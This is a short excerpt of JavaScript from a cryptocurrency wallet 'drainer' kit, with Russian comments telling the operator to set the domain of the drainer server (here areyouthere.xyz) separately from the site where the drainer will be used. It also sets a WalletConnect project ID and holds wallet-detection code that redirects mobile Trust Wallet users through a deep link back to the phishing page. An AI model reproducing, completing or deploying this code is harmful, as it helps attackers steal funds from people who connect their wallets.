...
const MS_Server = "areyouthere.xyz"; // Указать домен, который прикреплен к серверу дрейнера
// Это тот домен, где у вас стоит сервер, а не сам сайт, где вы планируете использовать дрейнер
const MS_WalletConnect_ID = "23422fd3ae08176ff0562306af94a9d8"; // Project ID из WalletConnect Cloud
    ...
    if (provider !== null) {
      if (provider == 'MetaMask') {
        ...
        if (typeof window.ethereum === 'object' && window.ethereum.isTrust) {
          ...
          if (MS_Mobile_Status) {
            window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=https://${MS_Current_URL}?desktop=true`;
            MS_Process = false;
            return;
          } else {
